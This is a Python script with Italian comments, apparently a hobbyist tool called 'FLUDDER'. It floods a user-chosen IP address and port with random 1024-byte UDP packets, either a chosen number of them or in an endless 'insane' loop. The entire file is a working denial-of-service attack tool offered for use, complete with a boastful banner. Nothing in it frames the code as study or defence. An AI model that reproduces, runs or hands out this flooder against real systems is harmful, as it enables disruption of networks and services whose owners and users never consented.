# IMPORT DELLE LIBRERIE
import random
import socket
import sys
import ipaddress

#ASCII BANNER
print("")
print("███████╗██╗     ██╗   ██╗██████╗ ██████╗ ███████╗██████╗ ")
print("██╔════╝██║     ██║   ██║██╔══██╗██╔══██╗██╔════╝██╔══██╗")
print("█████╗  ██║     ██║   ██║██║  ██║██║  ██║█████╗  ██████╔╝")
print("██╔══╝  ██║     ██║   ██║██║  ██║██║  ██║██╔══╝  ██╔══██╗")
print("██║     ███████╗╚██████╔╝██████╔╝██████╔╝███████╗██║  ██║")
print("╚═╝     ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
print("")
print("Unleash the power of this amazing UDP flooder!!!")    
print("")                                                     

# BLOCCO CONNESSIONE
data = random._urandom(1024) # DIMENSIONE DEI PACCHETTI DA INVIARE
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # TRASMISSIONE SU IPv4 - UDP

# FUNZIONE PRINCIPALE
def udp_flood():
    try:
        print("[+] Select the attack mode:\n") # SELEZIONE DELLA MODALITA' DI ATTACCO
        print("  ->  1. Quiet mode - You choose how many packets to send")
        print("  ->  2. Aggressive mode - Attacks goes on until you stop it\n")
        mode = input(">>> ")
        print("")

        if mode == "1": # QUIET MODE
            while True:
                try:
                    packets = int(input("[+] How many packets do you want to send?\n\n>>> ")) # NUMERO DI PACCHETTI DA INVIARE
                    print("")
                    if packets:
                        break
                except ValueError:
                    print("\n[-] Please enter a numeric value.") # ACCETTA SOLO VALORI NUMERICI
            while True:
                try:
                    ipaddr = str(input("[+] Insert a target IP Address:\n\n>>> ")) # INSERIMENTO TARGET IP
                    print("")
                    ipaddress.ip_address(ipaddr) # VERIFICA CHE L'INPUT RISPETTI IL FORMATO IPv4
                    break
                except ValueError:
                    print("\n[-] Invalid IP Address!")
            while True:
                try:
                    port = int(input("[+] Insert a target port:\n\n>>> ")) # INSERIMENTO DELLA PORTA
                    if port >= 1 and port <= 65535: # VERIFICA CHE IL VALORE RIENTRI NEL RANGE CORRETTO
                        break
                    else:
                        print("\n[-] Invalid port number. Port value must be between 1 and 65535!")
                except ValueError: # SE IL VALORE NON E' NUMERICO STAMPA UN ERRORE
                    print("\n[-] Please enter a numeric value.")

            print("")
            target = (ipaddr, port)
            for packet in range(packets): # LOOP DI INVIO PACCHETTI
                s.sendto(data, target)
                print("[+] BOOM! - Packet n." + str(packet + 1) + " sent!") # STAMPA IL NUMERO (+1) DI PACCHETTI INVIATI. PARTE DA 1 E NON DA 0

        elif mode == "2": # INSANE MODE
            while True:
                try:
                    ipaddr = str(input("[+] Insert a target IP Address:\n\n>>> ")) # INSERIMENTO TARGET IP
                    print("")
                    ipaddress.ip_address(ipaddr) # VERIFICA CHE L'INPUT RISPETTI IL FORMATO IPv4
                    break
                except ValueError:
                    print("[-] Invalid IP Address!")

            while True:
                try:
                    port = int(input("[+] Insert a target port:\n\n>>> ")) # INSERIMENTO DELLA PORTA
                    if port >= 1 and port <= 65535:  # VERIFICA CHE IL VALORE RIENTRI NEL RANGE CORRETTO
                        break
                    else:
                        print("\n[-] Invalid port number. Port value must be between 1 and 65535!")
                except ValueError: # SE IL VALORE NON E' NUMERICO STAMPA UN ERRORE
                    print("\n[-] Please enter a numeric value.")

            print("")       
            target = (ipaddr, port)
            print("[+] INSANE ATTACK IN PROGRESS!!")   
            try:  
                while 1 == 1: # LOOP INVIO PACCHETTI INFINITO
                    s.sendto(data, target)
            except KeyboardInterrupt: # SE L'UTENTE INTERROMPE L'ATTACCO IL LOOP SI FERMA E STAMPA LA STRINGA SOTTO
                print("\n\n[-] Attack interrupted") 
                sys.exit(0)

        else:
            print("\n[-] Invalid selection!") # SE L'UTENTE SCEGLIE UN VAOLRE DIVERSO DA 1 O DA 2 STAMPA L'ERRORE
            udp_flood()
    except KeyboardInterrupt: # SE L'UTENTE CHIUDE IL PROGRAMMA CON CTRL+C VIENE STAMPATO UN MESSAGGIO DI ARRIVEDERCI E ESCE DAL PROGRAMMA
        print("\n\n[-] See ya!")
        sys.exit(0)

udp_flood() # CHIAMATA DELLA FUNZIONE PRINCIPALE
